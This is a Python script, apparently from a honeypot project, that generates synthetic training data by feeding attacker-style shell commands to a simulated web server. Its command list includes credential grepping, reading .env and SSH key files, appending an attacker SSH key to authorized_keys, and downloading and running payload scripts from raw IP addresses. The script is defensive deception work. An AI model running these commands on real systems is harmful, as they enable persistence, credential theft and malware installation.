import json
from pathlib import Path

from honeymind.worlds.web_server_world import generate_web_server_world
from honeymind.sessions.response_simulator import simulate_response

OUTPUT_FILE = Path("data/deception_training_v6_variations.jsonl")
NUM_WORLDS = 1500

TASK_VARIATIONS = {
    "identity": [
        "whoami", "id", "hostname", "groups",
    ],
    "working_directory": [
        "pwd",
    ],
    "directory_listing": [
        "ls", "ls -la", "ll", "ls WEB_ROOT", "ls -la WEB_ROOT",
    ],
    "read_env_file": [
        "cat .env", "cat WEB_ROOT/.env", "cat /backup/old.env",
    ],
    "read_config_file": [
        "cat config.php", "cat wp-config.php", "cat app.js", "cat server.js",
        "cat package.json", "cat WEB_ROOT/config.php", "cat WEB_ROOT/wp-config.php",
        "cat WEB_ROOT/app.js", "cat WEB_ROOT/server.js",
    ],
    "find_files": [
        "find / -name '*.env' 2>/dev/null",
        "find / -name '*config*' 2>/dev/null",
        "find / -name '*.sql' 2>/dev/null",
        "find / -name '*.bak' 2>/dev/null",
    ],
    "grep_credentials": [
        'grep -R "DB_PASSWORD" . 2>/dev/null',
        'grep -R "password" . 2>/dev/null',
        'grep -R "SECRET" . 2>/dev/null',
        'grep -R "DB_PASSWORD" WEB_ROOT 2>/dev/null',
        'grep -Ri "password" WEB_ROOT 2>/dev/null',
    ],
    "process_enum": [
        "ps aux", "ps aux | grep nginx", "ps aux | grep apache", "ps aux | grep node",
    ],
    "network_enum": [
        "ss -tulpn", "netstat -tulpn", "ss -lntp",
    ],
    "sudo_policy": [
        "sudo -l",
    ],
    "system_info": [
        "cat /etc/os-release", "uname -a", "uname -r", "uptime", "df -h", "free -m",
    ],
    "persistence": [
        "crontab -l", "ls ~/.ssh", "cat ~/.ssh/authorized_keys",
        "mkdir -p /tmp/.x",
        "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfakekey attacker@host' >> ~/.ssh/authorized_keys",
    ],
    "malware_staging": [
        "wget http://185.62.190.12/bot.sh",
        "curl -O http://45.91.82.10/payload.sh",
        "chmod +x bot.sh",
        "./bot.sh",
        "nohup ./bot.sh >/dev/null 2>&1 &",
    ],
}


def replace_tokens(world, command):
    return command.replace("WEB_ROOT", world.web_root)


def valid_for_world(world, command):
    if "WEB_ROOT" in command:
        command = replace_tokens(world, command)

    if command.startswith("cat "):
        target = command.split(" ", 1)[1]
        if target.startswith(world.web_root + "/"):
            target = target.replace(world.web_root + "/", "")

        app_files = world.filesystem[world.web_root]
        if target in [".env", "config.php", "wp-config.php", "app.js", "server.js", "package.json"]:
            return target in app_files

    return True


def setup_world_for_command(world, command):
    if "WEB_ROOT" in command:
        command = replace_tokens(world, command)

    if (
        command.startswith("cat ")
        or command.startswith("grep -R")
        or command.startswith("grep -Ri")
        or command in ["ls", "ls -la", "ll"]
    ):
        simulate_response(world, f"cd {world.web_root}")

    return command


def build_text(world, task, command, output):
    return f"""<TASK>
{task}
</TASK>
<CTX>
hostname={world.hostname}
os={world.os}
kernel={world.kernel}
stack={world.stack}
web_root={world.web_root}
database={world.database}
user={world.user}
cwd={world.cwd}
known_files={", ".join(sorted(world.known_files))}
services={", ".join(world.services)}
</CTX>
<CMD>
{command}
</CMD>
<OUT>
{output}
</OUT>
"""


def main():
    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    count = 0

    with OUTPUT_FILE.open("w", encoding="utf-8") as f:
        for seed in range(NUM_WORLDS):
            for task, commands in TASK_VARIATIONS.items():
                for raw_command in commands:
                    world = generate_web_server_world(seed=seed)

                    if not valid_for_world(world, raw_command):
                        continue

                    command = setup_world_for_command(world, raw_command)
                    output = simulate_response(world, command)

                    row = {"text": build_text(world, task, command, output)}
                    f.write(json.dumps(row) + "\n")
                    count += 1

    print(f"Created {OUTPUT_FILE} with {count} examples")


if __name__ == "__main__":
    main()
